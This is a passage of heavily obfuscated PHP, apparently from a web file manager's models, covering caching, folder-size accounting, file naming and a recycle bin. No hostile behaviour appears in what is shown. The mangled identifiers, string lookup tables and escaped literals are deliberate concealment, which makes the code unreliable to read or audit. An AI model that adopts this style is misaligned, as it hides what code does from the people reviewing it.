_get(self::$cacheSourceInfo, $š‡Ê«õ¨); if ($µöèÒÉÎ) { return $µöèÒÉÎ; } $ò«Ø•Íß = $this->where(array($ÉáÉ§˜[194] => $œ¤­«Ãª))->find(); self::$cacheSourceInfo[$š‡Ê«õ¨] = $ò«Ø•Íß; return self::$cacheSourceInfo[$š‡Ê«õ¨]; } public function sourceCacheClear($àóÔÙÈÀ = false) { self::cacheClear($àóÔÙÈÀ); } public static function cacheClear($³ëÁüÇ· = false) { $Ú¨Î©¯Ğ =& $_SERVER[¼¥ÊĞÙÌ]; if ($³ëÁüÇ· == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ú¨Î©¯Ğ[536] . $³ëÁüÇ·]); unset(self::$cachePathInfoMore[$³ëÁüÇ·]); unset(self::$cachePathInfo[$Ú¨Î©¯Ğ[2310] . $³ëÁüÇ·]); unset(self::$cachePathInfo[$Ú¨Î©¯Ğ[2311] . $³ëÁüÇ·]); } public function metaSet($²şİ¾½˜, $á §Ì = null, $İ¨ãĞàš = null) { $§Â‰şÉ = parent::metaSet($²şİ¾½˜, $á §Ì, $İ¨ãĞàš); if ($§Â‰şÉ) { $this->sourceCacheClear($²şİ¾½˜); } return $§Â‰şÉ; } public function pathInfoByPath($á™­‰¯£, $¾Ö€İï‚) { $éÌ¹ñÙÙ =& $_SERVER[¼¥ÊĞÙÌ]; $ëº®ÀŠó = !$¾Ö€İï‚ ? array() : explode($éÌ¹ñÙÙ[8], trim($¾Ö€İï‚, $éÌ¹ñÙÙ[8])); $ÇÆ»¨¸Š = $á™­‰¯£; foreach ($ëº®ÀŠó as $Í­“íè) { $ğí§ñ÷½ = array($éÌ¹ñÙÙ[193] => $ÇÆ»¨¸Š, $éÌ¹ñÙÙ[32] => $Í­“íè); $Ş˜’¡ş¶ = $this->field($éÌ¹ñÙÙ[2312])->where($ğí§ñ÷½)->select(); if (!$Ş˜’¡ş¶) { return !1; } $Ş˜’¡ş¶ = array_sort_by($Ş˜’¡ş¶, $éÌ¹ñÙÙ[508]); $ÇÆ»¨¸Š = $Ş˜’¡ş¶[0][$éÌ¹ñÙÙ[194]]; } $‘¡š¢©Ì = $this->sourceInfo($ÇÆ»¨¸Š); $this->pathInfoFilter($‘¡š¢©Ì); return $‘¡š¢©Ì; } protected function updateModifyTime($ëİÌÈªõ) { $à²ïøÛİ =& $_SERVER[¼¥ÊĞÙÌ]; $ùç¡ÙŠ¾ = defined($à²ïøÛİ[2219]) ? USER_ID : 0; if (!$ëİÌÈªõ) { return; } if (!is_array($ëİÌÈªõ)) { $ëİÌÈªõ = array($ëİÌÈªõ); } foreach ($ëİÌÈªõ as $‰ÑÄ„ù => $ü¦©»®Œ) { $ëİÌÈªõ[$‰ÑÄ„ù] = intval($ü¦©»®Œ); $this->sourceCacheClear($ü¦©»®Œ); } $ûù™Ä¡ì = array($à²ïøÛİ[194] => array($à²ïøÛİ[7], $ëİÌÈªõ)); $«ÅğÜö = array($à²ïøÛİ[659] => $ùç¡ÙŠ¾, $à²ïøÛİ[501] => time()); $this->where($ûù™Ä¡ì)->save($«ÅğÜö); } public function folderSizeReset($´Ò› È‘, $±µ ‡ñ = false) { $’¾ØÍÎŒ =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->statusIgnoreResetSpace) { return; } $Ö™õÒÍ¨ = $this->sourceInfo($´Ò› È‘); $½É ù…Ê = $’¾ØÍÎŒ[2313] . $´Ò› È‘; CacheLock::lock($½É ù…Ê, 20); if ($±µ ‡ñ === !1) { $this->sourceCacheClear($´Ò› È‘); $Ö™õÒÍ¨ = $this->sourceInfo($´Ò› È‘); $ ÈØÃã = array($’¾ØÍÎŒ[480] => $´Ò› È‘, $’¾ØÍÎŒ[507] => 0); $Îã©ß­  = $this->where($ ÈØÃã)->sum($’¾ØÍÎŒ[79]); $±µ ‡ñ = intval($Îã©ß­ ) - intval($Ö™õÒÍ¨[$’¾ØÍÎŒ[79]]); } if ($±µ ‡ñ == 0) { return CacheLock::unlock($½É ù…Ê); } $±ÚÂŞ¡† = $this->parentLevelArray($Ö™õÒÍ¨[$’¾ØÍÎŒ[589]]); if (!$±ÚÂŞ¡†) { $±ÚÂŞ¡† = array(); } $±ÚÂŞ¡†[] = $Ö™õÒÍ¨[$’¾ØÍÎŒ[194]]; $ ÈØÃã = array($’¾ØÍÎŒ[194] => array($’¾ØÍÎŒ[495], $±ÚÂŞ¡†)); if ($±µ ‡ñ < 0) { $ ÈØÃã[$’¾ØÍÎŒ[79]] = array($’¾ØÍÎŒ[1101], abs($±µ ‡ñ)); } $this->where($ ÈØÃã)->setAdd($’¾ØÍÎŒ[79], $±µ ‡ñ); CacheLock::unlock($½É ù…Ê); $ÊõßÕ© = $’¾ØÍÎŒ[2314] . $Ö™õÒÍ¨[$’¾ØÍÎŒ[191]] . $’¾ØÍÎŒ[4] . $Ö™õÒÍ¨[$’¾ØÍÎŒ[574]]; $—Œ¡üÉ = array($Ö™õÒÍ¨[$’¾ØÍÎŒ[191]], $Ö™õÒÍ¨[$’¾ØÍÎŒ[574]]); TaskRun::timeLimitCall($ÊõßÕ©, $’¾ØÍÎŒ[2315], $—Œ¡üÉ, 1.5); } public function folderSizeResetChildren($ËÓ–Ò ¶) { $£Š¾Š·¥ =& $_SERVER[¼¥ÊĞÙÌ]; $this->sourceCacheClear($ËÓ–Ò ¶); $ìêÔØÚ¢ = $this->sourceInfo($ËÓ–Ò ¶); $®úÃ²¼Ü = array($£Š¾Š·¥[654] => 1, $£Š¾Š·¥[657] => $ìêÔØÚ¢[$£Š¾Š·¥[574]], $£Š¾Š·¥[660] => array($£Š¾Š·¥[620], $ìêÔØÚ¢[$£Š¾Š·¥[589]] . $ËÓ–Ò ¶ . $£Š¾Š·¥[621])); $¹Ô²‡Ò¼ = $£Š¾Š·¥[2316]; $Ê«Í´Û¾ = $this->field($¹Ô²‡Ò¼)->where($®úÃ²¼Ü)->select(); $®úÃ²¼Ü[$£Š¾Š·¥[488]] = 0; $­ñÖÖÑ‘ = $this->field($¹Ô²‡Ò¼)->where($®úÃ²¼Ü)->select(); if (!$­ñÖÖÑ‘) { return; } $Ê«Í´Û¾[] = $ìêÔØÚ¢; $Ê«Í´Û¾ = array_to_keyvalue($Ê«Í´Û¾, $£Š¾Š·¥[194]); foreach ($Ê«Í´Û¾ as $¤”¯º => $£Á•ËÆ£) { $Ê«Í´Û¾[$¤”¯º][$£Š¾Š·¥[2317]] = $Ê«Í´Û¾[$¤”¯º][$£Š¾Š·¥[79]]; $Ê«Í´Û¾[$¤”¯º][$£Š¾Š·¥[79]] = 0; } foreach ($­ñÖÖÑ‘ as $£Á•ËÆ£) { $•Ç™ĞõÔ = $£Á•ËÆ£[$£Š¾Š·¥[193]] . $£Š¾Š·¥[12]; if (!isset($Ê«Í´Û¾[$•Ç™ĞõÔ])) { continue; } if ($£Á•ËÆ£[$£Š¾Š·¥[508]] == $Ê«Í´Û¾[$•Ç™ĞõÔ][$£Š¾Š·¥[508]]) { $Ê«Í´Û¾[$•Ç™ĞõÔ][$£Š¾Š·¥[79]] += $£Á•ËÆ£[$£Š¾Š·¥[79]]; } } foreach ($Ê«Í´Û¾ as $£Á•ËÆ£) { $ûéï­™½ = $this->parentLevelArray($£Á•ËÆ£[$£Š¾Š·¥[589]]); foreach ($ûéï­™½ as $•Ç™ĞõÔ) { $•Ç™ĞõÔ = $•Ç™ĞõÔ . $£Š¾Š·¥[12]; if (!isset($Ê«Í´Û¾[$•Ç™ĞõÔ])) { continue; } if ($£Á•ËÆ£[$£Š¾Š·¥[508]] == $Ê«Í´Û¾[$•Ç™ĞõÔ][$£Š¾Š·¥[508]]) { $Ê«Í´Û¾[$•Ç™ĞõÔ][$£Š¾Š·¥[79]] += $£Á•ËÆ£[$£Š¾Š·¥[79]]; } } } $èÖìÃ¨ö = array(); foreach ($Ê«Í´Û¾ as $£Á•ËÆ£) { if ($£Á•ËÆ£[$£Š¾Š·¥[79]] == $£Á•ËÆ£[$£Š¾Š·¥[2317]]) { continue; } $èÖìÃ¨ö[] = array($£Š¾Š·¥[194], $£Á•ËÆ£[$£Š¾Š·¥[194]], $£Š¾Š·¥[79], $£Á•ËÆ£[$£Š¾Š·¥[79]]); } $this->saveAll($èÖìÃ¨ö); } public function userSpaceReset($³óü¡Š = false) { $ùù¹ı¨İ =& $_SERVER[¼¥ÊĞÙÌ]; $’éşŠ§˜ = $this->where(array($ùù¹ı¨İ[191] => self::TYPE_USER, $ùù¹ı¨İ[574] => $³óü¡Š, $ùù¹ı¨İ[488] => 0))->sum($ùù¹ı¨İ[79]); $’éşŠ§˜ = !$’éşŠ§˜ || $’éşŠ§˜ <= 0 ? 0 : $’éşŠ§˜; Model($ùù¹ı¨İ[582])->userEdit($³óü¡Š, array($ùù¹ı¨İ[1980] => $’éşŠ§˜)); } public function targetSpaceUpdate($¥ü¼æ , $Š¼±Ëé) { $‹ô³„ñ‚ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Š¼±Ëé) { return; } if (!in_array($¥ü¼æ , array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $­œåÆ§… = $this->targetSpaceSize($¥ü¼æ , $Š¼±Ëé); if ($¥ü¼æ  == self::TYPE_USER) { Model($‹ô³„ñ‚[582])->userEdit($Š¼±Ëé, array($‹ô³„ñ‚[1980] => $­œåÆ§…)); } else { if ($¥ü¼æ  == self::TYPE_GROUP) { Model($‹ô³„ñ‚[590])->groupEdit($Š¼±Ëé, array($‹ô³„ñ‚[1980] => $­œåÆ§…)); } } } public function targetSpaceSize($ö€ŞÀîœ, $‘ùÉ†×”) { $‘Æ‰‡—½ =& $_SERVER[¼¥ÊĞÙÌ]; $Ó¸Ïáş = 0; $Ç™‘ÈÉ¸ = $this->targetSourceRoot($ö€ŞÀîœ, $‘ùÉ†×”, !0); foreach ($Ç™‘ÈÉ¸ as $­™Äœ) { if (!$­™Äœ) { continue; } $Ó¸Ïáş += floatval($­™Äœ[$‘Æ‰‡—½[79]]); $ş€òç¶ø = array($‘Æ‰‡—½[660] => array($‘Æ‰‡—½[620], $‘Æ‰‡—½[598] . $­™Äœ[$‘Æ‰‡—½[194]] . $‘Æ‰‡—½[621])); $†ŸÁ™¸¨ = Model($‘Æ‰‡—½[506])->field($‘Æ‰‡—½[494])->where($ş€òç¶ø)->select(); $†ŸÁ™¸¨ = array_to_keyvalue($†ŸÁ™¸¨, $‘Æ‰‡—½[12], $‘Æ‰‡—½[194]); $†ŸÁ™¸¨ = array_unique(array_filter($†ŸÁ™¸¨)); if ($†ŸÁ™¸¨) { $ş€òç¶ø = array($‘Æ‰‡—½[494] => array($‘Æ‰‡—½[495], $†ŸÁ™¸¨)); $Ó¸Ïáş += floatval($this->where($ş€òç¶ø)->sum($‘Æ‰‡—½[79])); } } $Ó¸Ïáş = !$Ó¸Ïáş || $Ó¸Ïáş <= 0 ? 0 : $Ó¸Ïáş; return $Ó¸Ïáş; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($šòß‰Ëˆ) { return $this->fileTypeProfile($šòß‰Ëˆ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ùãŠÙ‡Ù) { return $this->fileTypeProfile($ùãŠÙ‡Ù, SourceModel::TYPE_GROUP); } private function fileTypeProfile($œğ‡Şö£, $¾Û„ş°ì) { $ùŞ²±Œß =& $_SERVER[¼¥ÊĞÙÌ]; $­Á„Óà‰ = $ùŞ²±Œß[2318] . $œğ‡Şö£ . $ùŞ²±Œß[11] . $¾Û„ş°ì; $¾íˆ’ŒĞ = Cache::get($­Á„Óà‰); if ($¾íˆ’ŒĞ) { return $¾íˆ’ŒĞ; } $ƒì›°½¦ = array($ùŞ²±Œß[654] => 0); if ($œğ‡Şö£ != !1) { $ƒì›°½¦[$ùŞ²±Œß[574]] = $œğ‡Şö£; $ƒì›°½¦[$ùŞ²±Œß[191]] = $¾Û„ş°ì; } $èêœÀ…ô = array(); $èêœÀ…ô[$ùŞ²±Œß[2319]] = array($ùŞ²±Œß[2320] => LNG($ùŞ²±Œß[2319]), $ùŞ²±Œß[2321] => $this->where($ƒì›°½¦)->count(), $ùŞ²±Œß[625] => $this->where($ƒì›°½¦)->sum($ùŞ²±Œß[79])); $øÔ¼ÜÊ = KodIO::fileTypeList(); foreach ($øÔ¼ÜÊ as $åÒô¯»ã => $µûïÍ ) { $ƒì›°½¦[$ùŞ²±Œß[489]] = $this->fileTypeWhere($åÒô¯»ã); $èêœÀ…ô[$åÒô¯»ã] = array($ùŞ²±Œß[2320] => $µûïÍ [$ùŞ²±Œß[32]], $ùŞ²±Œß[2321] => $this->where($ƒì›°½¦)->count(), $ùŞ²±Œß[625] => $this->where($ƒì›°½¦)->sum($ùŞ²±Œß[79])); } Cache::set($­Á„Óà‰, $èêœÀ…ô, 1200); return $èêœÀ…ô; } public function fileNameExist($Æ¥İÓÏŞ, $âô¨óêä) { $ÄôŒÌÃá =& $_SERVER[¼¥ÊĞÙÌ]; $ÉÍ¾ô¯ª = $this->field($ÄôŒÌÃá[2322])->where(array($ÄôŒÌÃá[193] => $Æ¥İÓÏŞ, $ÄôŒÌÃá[32] => $âô¨óêä, $ÄôŒÌÃá[508] => 0))->find(); return is_array($ÉÍ¾ô¯ª) ? $ÉÍ¾ô¯ª[$ÄôŒÌÃá[194]] : !1; } public function childList($ìÚ–«Øè) { $çÆ¾‘÷© =& $_SERVER[¼¥ÊĞÙÌ]; $»Úë—ß = $çÆ¾‘÷©[2294] . $ìÚ–«Øè; if (isset(self::$cacheChildList[$»Úë—ß])) { return self::$cacheChildList[$»Úë—ß]; } $âşËŠóÙ = array($çÆ¾‘÷©[193] => intval($ìÚ–«Øè), $çÆ¾‘÷©[508] => 0); $ÁÛÆ¦‰í = $this->where($âşËŠóÙ)->select(); $ÁÛÆ¦‰í = $ÁÛÆ¦‰í ? $ÁÛÆ¦‰í : array(); self::$cacheChildList[$»Úë—ß] = $ÁÛÆ¦‰í; foreach ($ÁÛÆ¦‰í as $ˆ“í·Šú) { $»Úë—ß = $çÆ¾‘÷©[536] . $ˆ“í·Šú[$çÆ¾‘÷©[194]]; self::$cacheSourceInfo[$»Úë—ß] = $ˆ“í·Šú; } return $ÁÛÆ¦‰í; } public function fileNameAuto($ûæ†ê—, $²¨ËÉ‘Ö, $›ÓşÍ¹‹ = REPEAT_RENAME, $ø•ºƒ¾ = false) { $ÛÍú¢Î =& $_SERVER[¼¥ÊĞÙÌ]; $¤ˆûƒØ÷ = get_path_ext($²¨ËÉ‘Ö); $·Î“©ÖÃ = $¤ˆûƒØ÷ ? get_path_ext_name($²¨ËÉ‘Ö) . $ÛÍú¢Î[2323] . $¤ˆûƒØ÷ : $²¨ËÉ‘Ö . $ÛÍú¢Î[463]; $™Ç£úŸÙ = array($ÛÍú¢Î[193] => $ûæ†ê—, $ÛÍú¢Î[508] => 0, $ÛÍú¢Î[32] => array($ÛÍú¢Î[462], $·Î“©ÖÃ)); $À¹éÜ¿ = $this->field($ÛÍú¢Î[32])->where($™Ç£úŸÙ)->select(); $Á —Ô = array_to_keyvalue($À¹éÜ¿, $ÛÍú¢Î[12], $ÛÍú¢Î[32]); return $this->fileNameAutoGet($Á —Ô, $²¨ËÉ‘Ö, $›ÓşÍ¹‹, $ø•ºƒ¾); } public function fileNameAutoGet($°¾ä‚·, $¡¬µ¦¾ã, $Å¸…æ¦á, $Òï™ú•„) { $Ø—ú®è =& $_SERVER[¼¥ÊĞÙÌ]; if ($Å¸…æ¦á == REPEAT_REPLACE || !$°¾ä‚· || !in_array_not_case($¡¬µ¦¾ã, $°¾ä‚·) || $Òï™ú•„ && $Å¸…æ¦á != REPEAT_RENAME_FOLDER) { return $¡¬µ¦¾ã; } if ($Å¸…æ¦á == REPEAT_SKIP) { return !1; } $¶ÔÚ¢™ = $Ø—ú®è[10] . get_path_ext($¡¬µ¦¾ã); $¶ÔÚ¢™ = $¶ÔÚ¢™ == $Ø—ú®è[10] || $Òï™ú•„ ? $Ø—ú®è[12] : $¶ÔÚ¢™; for ($ûıƒ¨­² = 1; $ûıƒ¨­² <= count($°¾ä‚·) + 1; $ûıƒ¨­²++) { $‡èÉ…­ = substr($¡¬µ¦¾ã, 0, strlen($¡¬µ¦¾ã) - strlen($¶ÔÚ¢™)); $ª€ßü­ = $‡èÉ…­ . "\x28{$ûıƒ¨­²}\51{$¶ÔÚ¢™}"; if (!in_array_not_case($ª€ßü­, $°¾ä‚·)) { return $ª€ßü­; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\x63\145\x5f\162\x65\143\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\151\155\145", "\164\x69\x6d\x65", "\151\156\x73\145\x72\x74", "\x66\x75\x6e\x63\164\x69\x6f\156")); public function listData($Åœ¥­Ÿ² = false) { $µà¡ã§î =& $_SERVER[¼¥ÊĞÙÌ]; $Åœ¥­Ÿ² = $Åœ¥­Ÿ² ? $Åœ¥­Ÿ² : USER_ID; $Ö›ÑÙ÷Û = $this->where(array($µà¡ã§î[1781] => $Åœ¥­Ÿ²))->select(); return array_to_keyvalue($Ö›ÑÙ÷Û, $µà¡ã§î[12], $µà¡ã§î[194]); } public function moveToRecycle($Â»µ¡‹ø) { $Ò‚ßĞÁã =& $_SERVER[¼¥ÊĞÙÌ]; $¼ ˆ¹Ñí = Model($Ò‚ßĞÁã[1440]); $ÛéÙ¢°Ã = $¼ ˆ¹Ñí->sourceInfo($Â»µ¡‹ø); if (!$ÛéÙ¢°Ã || $ÛéÙ¢°Ã[$Ò‚ßĞÁã[508]] == $Ò‚ßĞÁã[91]) { return; } $àªŒ†à = array($Ò‚ßĞÁã[494] => $Â»µ¡‹ø, $Ò‚ßĞÁã[1781] => USER_ID, $Ò‚ßĞÁã[656] => $ÛéÙ¢°Ã[$Ò‚ßĞÁã[191]], $Ò‚ßĞÁã[657] => $ÛéÙ¢°Ã[$Ò‚ßĞÁã[574]], $Ò‚ßĞÁã[660] => $ÛéÙ¢°Ã[$Ò‚ßĞÁã[589]]); $this->add($àªŒ†à); $this->recycleMove($Â»µ¡‹ø, 1); if ($ÛéÙ¢°Ã[$Ò‚ßĞÁã[488]] == $Ò‚ßĞÁã[91]) { $Ùá›ÌÍ = array($Ò‚ßĞÁã[660] => array($Ò‚ßĞÁã[620], $ÛéÙ¢°Ã[$Ò‚ßĞÁã[589]] . $Â»µ¡‹ø . $Ò‚ßĞÁã[621])); $¼ ˆ¹Ñí->where($Ùá›ÌÍ)->setField($Ò‚ßĞÁã[508], 1); } } public function clear() { $this->remove(!1); } public function remove($—ô®àì = false, $€¯Ä¬áò = false) { $Û–ü¬ôò =& $_SERVER[¼¥ÊĞÙÌ]; $€¯Ä¬áò = $€¯Ä¬áò ? $€¯Ä¬áò : USER_ID; $†³†Ú¿µ = Model($Û–ü¬ôò[1440]); $ï¢ºŠÁş = $this->listData($€¯Ä¬áò); $—ô®àì = $—ô®àì === !1 ? !1 : $—ô®àì; $ÆàÛ¥û = array(); foreach ($ï¢ºŠÁş as $—¯ß¥ùë) { if ($—ô®àì != !1 && !in_array($—¯ß¥ùë, $—ô®àì)) { continue; } $±ÌûãĞ‰ = $†³†Ú¿µ->sourceInfo($—¯ß¥ùë); $†³†Ú¿µ->remove($—¯ß¥ùë, !1); $†òÊ´÷Ê = $±ÌûãĞ‰[$Û–ü¬ôò[191]] . $Û–ü¬ôò[11] . $±ÌûãĞ‰[$Û–ü¬ôò[574]]; $ÆàÛ¥û[$†òÊ´÷Ê] = array($Û–ü¬ôò[656] => $±ÌûãĞ‰[$Û–ü¬ôò[191]], $Û–ü¬ôò[574] => $±ÌûãĞ‰[$Û–ü¬ôò[574]]); $this->where(array($Û–ü¬ôò[194] => $—¯ß¥ùë))->delete(); } foreach ($ÆàÛ¥û as $ØË§¹•—) { $†³†Ú¿µ->targetSpaceUpdate($ØË§¹•—[$Û–ü¬ôò[191]], $ØË§¹•—[$Û–ü¬ôò[574]]); } } public function restore($¹‚ßßÚ´ = false) { $±±·ã´ = $this->listData(); $this->_restoreSource($±±·ã´, $¹‚ßßÚ´); } public function removeUserAll($Ê½Ï“¥£) { $this->remove(!1, $Ê½Ï“¥£); } public function restoreItem($ƒù–…¿Ş) { $this->_restoreSource(array($ƒù–…¿Ş), array($ƒù–…¿Ş)); } private function _restoreSource($¼µøˆ¼Í, $«ş¯ãü) { $€·€‹Üì =& $_SERVER[¼¥ÊĞÙÌ]; $²Á „ÙÔ = Model($€·€‹Üì[1440]); $«ş¯ãü = $«ş¯ãü == !1 ? !1 : $«ş¯ãü; if (!$¼µøˆ¼Í) { return !0; } $¸¥Ğ¥»û = array(); foreach ($¼µøˆ¼Í as $èù«ãÌ) { if ($«ş¯ãü != !1 && !in_array($èù«ãÌ, $«ş¯ãü)) { continue; } $Ù‡Ò¡‹² = $²Á „ÙÔ->sourceInfo($èù«ãÌ); $öİƒ¼‡ = $²Á „ÙÔ->sourceInfo($Ù‡Ò¡‹²[$€·€‹Üì[193]]); if ($öİƒ¼‡[$€·€‹Üì[508]] == $€·€‹Üì[91]) { continue; } $²Á „ÙÔ->lockMoveStart($èù«ãÌ); $this->recycleMove($èù«ãÌ, 0); if ($Ù‡Ò¡‹²[$€·€‹Üì[488]] == $€·€‹Üì[91]) { $ÆáÌ—º¤ = array($€·€‹Üì[660] => array($€·€‹Üì[620], $Ù‡Ò¡‹²[$€·€‹Üì[589]] . $èù«ãÌ . $€·€‹Üì[621])); $²Á „ÙÔ->where($ÆáÌ—º¤)->setField($€·€‹Üì[508], 0); $this->restoreFolderChildren($èù«ãÌ, $¼µøˆ¼Í); } $this->where(array($€·€‹Üì[194] => $èù«ãÌ))->delete(); $²Á „ÙÔ->folderSizeReset($Ù‡Ò¡‹²[$€·€‹Üì[193]]); $¸¥Ğ¥»û[] = $Ù‡Ò¡‹²[$€·€‹Üì[193]]; if ($Ù‡Ò¡‹²[$€·€‹Üì[488]] == $€·€‹Üì[91]) { $¸¥Ğ¥»û[] = $èù«ãÌ; } $²Á „ÙÔ->lockMoveEnd($èù«ãÌ); } $²Á „ÙÔ->updateModifyTime($¸¥Ğ¥»û); } private function restoreFolderChildren($©Ïñ‹æä, $³¦ÇÁ…›) { $Í¾¡ĞœÈ =& $_SERVER[¼¥ÊĞÙÌ]; $‚ûœæ = Model($Í¾¡ĞœÈ[1440]); $ƒ ô™­ô = array($Í¾¡ĞœÈ[194] => array($Í¾¡ĞœÈ[7], array())); foreach ($³¦ÇÁ…› as $°éãß–„) { if ($°éãß–„ == $©Ïñ‹æä) { continue; } if (!$‚ûœæ->isParentOf($©Ïñ‹æä, $°éãß–„)) { continue; } $Â–Û™ÈÃ = $‚ûœæ->sourceInfo($°éãß–„); if ($Â–Û™ÈÃ[$Í¾¡ĞœÈ[488]] == $Í¾¡ĞœÈ[91]) { $ƒ ô™­ô[] = array($Í¾¡ĞœÈ[660] => array($Í¾¡ĞœÈ[620], $Â–Û™ÈÃ[$Í¾¡ĞœÈ[589]] . $°éãß–„ . $Í¾¡ĞœÈ[621])); } else { $ƒ ô™­ô[$Í¾¡ĞœÈ[194]][1][] = $°éãß–„; } } if (!$ƒ ô™­ô[$Í¾¡ĞœÈ[194]][1]) { unset($ƒ ô™­ô[$Í¾¡ĞœÈ[194]]); } if (!$ƒ ô™­ô) { return; } if (is_array($ƒ ô™­ô[$Í¾¡ĞœÈ[194]]) && is_array($ƒ ô™­ô[$Í¾¡ĞœÈ[194]][1])) { $ƒ ô™­ô[$Í¾¡ĞœÈ[194]][1] = array_unique($ƒ ô™­ô[$Í¾¡ĞœÈ[194]][1]); } $ƒ ô™­ô[$Í¾¡ĞœÈ[1086]] = $Í¾¡ĞœÈ[2094]; $‚ûœæ->where($ƒ ô™­ô)->setField($Í¾¡ĞœÈ[508], 1); } private function recycleMove($Õöö¡âã, $¨ê±Ä³™ = 1) { $§Ë‹åè =& $_SERVER[¼¥ÊĞÙÌ]; $ñÆ•ˆÂÎ = Model($§Ë‹åè[1440]); $ä×Ú“’½ = Model($§Ë‹åè[2324]); $è¯´¢ÈÆ = array($§Ë‹åè[194] => $Õöö¡âã); if ($¨ê±Ä³™) { $ñÆ•ˆÂÎ->where($è¯´¢ÈÆ)->setField($§Ë‹åè[508], 1); $ä×Ú“’½->eventRecycle($Õöö¡âã, $§Ë‹åè[2325]); } else { $£§ŞŒÈæ = $ñÆ•ˆÂÎ->where($è¯´¢ÈÆ)->find(); $ŸÜçèû¾ = $£§ŞŒÈæ[$§Ë‹åè[488]] == $§Ë‹åè[91]; $“ƒ±¡©ç = $ñÆ•ˆÂÎ->fileNameAuto($£§ŞŒÈæ[$§Ë‹åè[193]], $£§ŞŒÈæ[$§Ë‹åè[32]], REPEAT_RENAME_FOLDER, $ŸÜçèû¾); if ($“ƒ±¡©ç != $£§ŞŒÈæ[$§Ë‹åè[32]]) { $ñÆ•ˆÂÎ->rename($Õöö¡âã, $“ƒ±¡©ç); } $ñÆ•ˆÂÎ->where($è¯´¢ÈÆ)->setField($§Ë‹åè[508], 0); $ä×Ú“’½->eventRecycle($Õöö¡âã, $§Ë‹åè[2326]); } } } goto cÕ«éË°ÓÇ; EÈ‘†…›å: define($_SERVER[¼¥ÊĞÙÌ][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\157\x72\x64\145\x72", "\x61\154\x69\x61\163", "\x68\x61\166\x69\156\x67", "\147\x72\x6f\165\160", "\x6c\157\143\x6b", "\x64\151\163\x74\151\x6e\143\x74", "\141\x75\x74\x6f", "\146\x69\154\164\145\x72", "\x76\x61\154\x69\144\141\164\x65", "\x72\x65\x73\165\x6c\x74", "\x62\151\156\x64", "\164\x6f\x6b\x65\x6e"); public function __construct($öŸÕï¢º = '', $éÊ¨®‘Ë = '', $öÂ³ßöş = '') { $ŸúÚ¤Ãˆ =& $_SERVER[¼¥ÊĞÙÌ]; $this->_initialize(); if (!empty($öŸÕï¢º)) { if (strpos($öŸÕï¢º, $ŸúÚ¤Ãˆ[10])) { list($this->dbName, $this->name) = explode($ŸúÚ¤Ãˆ[10], $öŸÕï¢º); } else { $this->name = $öŸÕï¢º; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($éÊ¨®‘Ë)) { $this->tablePrefix = $ŸúÚ¤Ãˆ[12]; } elseif ($ŸúÚ¤Ãˆ[12] != $éÊ¨®‘Ë) { $this->tablePrefix = $éÊ¨®‘Ë; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ŸúÚ¤Ãˆ[324]); } $this->db(0, empty($this->connection) ? $öÂ³ßöş : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ó‘ëÒ®— =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($this->fields)) { if (think_config($Ó‘ëÒ®—[325])) { $ÏÂÏìÔ® = $this->dbName ? $this->dbName : think_config($Ó‘ëÒ®—[326]); $·Û“ò¯ = think_var_cache($Ó‘ëÒ®—[327] . strtolower(get_path_this($ÏÂÏìÔ®) . $Ó‘ëÒ®—[10] . $this->name)); if ($·Û“ò¯) { $ü€ˆÖÆÈ = think_config($Ó‘ëÒ®—[328]); if (empty($ü€ˆÖÆÈ) || $·Û“ò¯[$Ó‘ëÒ®—[329]] == $ü€ˆÖÆÈ) { $this->fields = $·Û“ò¯; return; } } } $this->flush(); } } public function flush() { $şÖÂóã‡ =& $_SERVER[¼¥ÊĞÙÌ]; $this->db->setModel($this->name); $½ÈÄğ‹ = $this->db->getFields($this->getTableName()); if (!$½ÈÄğ‹) { return !1; } $this->fields = array_keys($½ÈÄğ‹); $this->fields[$şÖÂóã‡[330]] = !1; foreach ($½ÈÄğ‹ as $á¦Ø³…É => $ì—¶ª¡) { $ßìêÉ³¿[$á¦Ø³…É] = $ì—¶ª¡[$şÖÂóã‡[33]]; if ($ì—¶ª¡[$şÖÂóã‡[39]]) { $this->fields[$şÖÂóã‡[331]] = $á¦Ø³…É; if ($ì—¶ª¡[$şÖÂóã‡[42]]) { $this->fields[$şÖÂóã‡[330]] = !0; } } } $this->fields[$şÖÂóã‡[332]] = $ßìêÉ³¿; if (think_config($şÖÂóã‡[328])) { $this->fields[$şÖÂóã‡[329]] = think_config($şÖÂóã‡[328]); } if (think_config($şÖÂóã‡[325])) { $ğöë— = $this->dbName ? $this->dbName : think_config($şÖÂóã‡[326]); think_var_cache($şÖÂóã‡[327] . strtolower(get_path_this($ğöë—) . $şÖÂóã‡[10] . $this->name), $this->fields); } } public function switchModel($ñİ¹¼Î‚, $àŸüÀÓ† = array()) { $÷Ïö¥ıœ =& $_SERVER[¼¥ÊĞÙÌ]; $â¨¿½‹­ = ucwords(strtolower($ñİ¹¼Î‚)) . $÷Ïö¥ıœ[333]; if (!class_exists($â¨¿½‹­)) { think_exception($â¨¿½‹­ . think_lang($÷Ïö¥ıœ[334])); } $this->_extModel = new $â¨¿½‹­($this->name); if (!empty($àŸüÀÓ†)) { foreach ($àŸüÀÓ† as $¡”àïÒÖ) { $this->_extModel->setProperty($¡”àïÒÖ, 